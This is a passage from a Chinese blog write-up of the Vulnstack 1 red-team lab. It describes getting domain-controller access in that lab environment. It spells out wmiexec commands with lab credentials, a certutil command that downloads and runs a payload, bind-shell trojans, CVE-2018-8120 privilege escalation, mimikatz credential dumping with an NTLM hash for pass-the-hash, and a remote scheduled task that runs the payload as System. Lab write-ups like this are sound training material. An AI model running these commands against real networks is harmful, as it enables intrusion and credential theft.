+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe vmiexec.vbs &#x2F;cmd 192.168.52.138 administrator hongrisec@2020 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p>或者直接使用之前上传的Ladom工具执行<code>ladom wmiexec 192.168.52.138 administrator hongrisec@2020 whoami</code></p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/48.png" alt></p>
+<p>同上面的过程一样，我们需要获取一个正向的msf连接，过程如下：</p>
+<p>首先生成一个正向的exe文件放到win7的网站目录上</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/49.png" alt></p>
+<p>在win7上查看</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/50.png" alt></p>
+<p>在win7上使用WMI执行命令<code>certutil.exe -urlcache -split -f http://192.168.52.143/6666.exe&amp;6666.exe</code></p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/51.png" alt></p>
+<p>成功执行，这时候在138机器（DC—win2008）上开启6666端口监听</p>
+<p>然后我们在msf上个运行blin_tcp来获取回话</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/52.png" alt></p>
+<p>忘记改端口了，修改端口为6666</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/53.png" alt></p>
+<p>成功获取域控权限，后续提权，可以使用msf mimikatz进一步获取用户密码等。（msf连接过程中保持内网流量转发：步骤5.2，如果无法获取会话在kali上扫描138主机6666端口是否开放，如果没有开放参考3.6，同样使用vmi命令关闭防火墙后重，我使用的是之前上传的K8大神的Lodan工具，是因为vbs脚本一直没有回显，后来重启win2008域控服务器才有回显）</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/54.png" alt="img"></p>
+<p>下一步开始提权，尝试多种提权方法均失败</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/55.png" alt="img"></p>
+<p>然后上网查看资料，使用CVE-2018-8120来提权，直接文件上传upload CVE-2018-8120-master提权程序<br><img src="/2020/09/28/ATC-CK-Vulnstack-1/56.png" alt="img"></p>
+<p>成功提权，上免杀mimikatz</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/57.png" alt="img"></p>
+<p>用户所有密码都会保存在mz.log文件中，可以直接type mz.log查看</p>
+<p><img src="/2020/09/28/ATC-CK-Vulnstack-1/58.png" alt="img"></p>
+<h3 id="5-6-票据加计划任务获取DC"><a href="#5-6-票据加计划任务获取DC" class="headerlink" title="5.6 票据加计划任务获取DC"></a>5.6 票据加计划任务获取DC</h3><blockquote>
+<p>这是博客<a href="https://www.cnblogs.com/Ekko-z/p/12991730.html" target="_blank" rel="noopener">ATT&amp;CK红队评估实战靶场(一)</a>的获取域控方法，感觉太过复杂，本人没有尝试，这里也放在这里供大家参考。</p>
+</blockquote>
+<p>mimikatz sekurlsa::pth /domain:god.org /user:administrator /ntlm:81be2f80d568100549beac645d6a7141<br><img src="/2020/09/28/ATC-CK-Vulnstack-1/59.png" alt="img"><br>shell dir \192.168.52.138\c$ //dir DC的目录<br><img src="/2020/09/28/ATC-CK-Vulnstack-1/60.png" alt="img"><br>生成一个exe马<br>这里用windows/reverse_bind_tcp LHOST=0.0.0.0 LPORT=7777 生成正向的马 yukong.exe<br>把马复制到域控机器上shell copy C:\yukong.exe \192.168.52.138\c$<br>然后再用这个写入计划任务的方法去连接，这里马反弹会连不成功，所以<br>shell schtasks /create /tn “test” /tr C:\yukong.exe /sc once /st 22:14 /S 192.168.52.138 /RU System /u administrator /p “hongrisec@2020”<br>挂着win7代理 proxy nc -vv 192.168.52.138 7777 即可弹回DC138的shell<br>用Meterpreter的马也可以，之前失败了，后续还是改成meterpreter的马，或者把普通shell再升级成meterpreter再导入cs也可以<br>马上线之后清除计划任务schtasks /delete /s 192.168.52.138 /tn “test” /f</p>
+<h2 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h2><p>当然最后获取域控权限的方法还有好多，向pth攻击、横向哈希传递、redis等等，还有后续的痕迹清理日志清楚都没有涉及，经过这一次充分认识到自己的不足，还需要多加学习，有些地方自己还是没有完全弄明白，只是完全参考网络上的大神们的教程，文中有错漏的地方希望大家多多包含，我只是用了我觉得最简单的思路进行攻击，更复杂的没有涉及，希望以后能多多练习这样的靶机学习更牛的技能，最后谢谢红日团队给出的这个靶机，后续还有一系列靶机，有时间会慢慢逐个尝试。</p>
+<h2 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h2><p><a href="https://www.freebuf.com/column/231111.html" target="_blank" rel="noopener">ATT&amp;CK实战 | Vulnstack 红队（一）</a></p>
+<p><a href="https://www.freebuf.com/articles/web/230476.html" target="_blank" rel="noopener">ATT&amp;CK实战 | 红队评估一(上)</a></p>
+<p><a href="https://www.freebuf.com/articles/web/230725.html" target="_blank" rel="noopener">ATT&amp;CK实战 | 红队评估一(下)</a></p>
+<p><a href="https://www.cnblogs.com/Ekko-z/p/12991730.html" target="_blank" rel="noopener">ATT&amp;CK红队评估实战靶场(一)</a></p>
+<p><a href="https://www.freebuf.com/articles/network/125278.html" target="_blank" rel="noopener">图解Meterpreter实现网络穿透的方法</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1633420" target="_blank" rel="noopener">内网渗透靶机-VulnStack 1</a></p>
+<p><a href="https://www.freebuf.com/column/162886.html" target="_blank" rel="noopener">代码审计| yxcms app 1.4.6 漏洞集合</a></p>
+<p><a href="https://www.anquanke.com/post/id/189940" target="_blank" rel="noopener">从外网到域控（vulnstack靶机实战）</a></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ch4ce</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/09/28/ATC-CK-Vulnstack-1/">http://yoursite.com/2020/09/28/ATC-CK-Vulnstack-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yoursite.com">Chaceshadow's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0/">红队评估</a><a class="post-meta__tags" href="/tags/ATK-CK/">ATK&amp;CK</a><a class="post-meta__tags" href="/tags/vulnstack/">vulnstack</a><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2020/09/28/The-Security-of-Software-Evaluation/"><span>The Security of Software Evaluation</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/welcome-image.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2020 By Ch4ce</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/algolia.js?version=1.7.0"></script><script src="/js/search/local-search.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
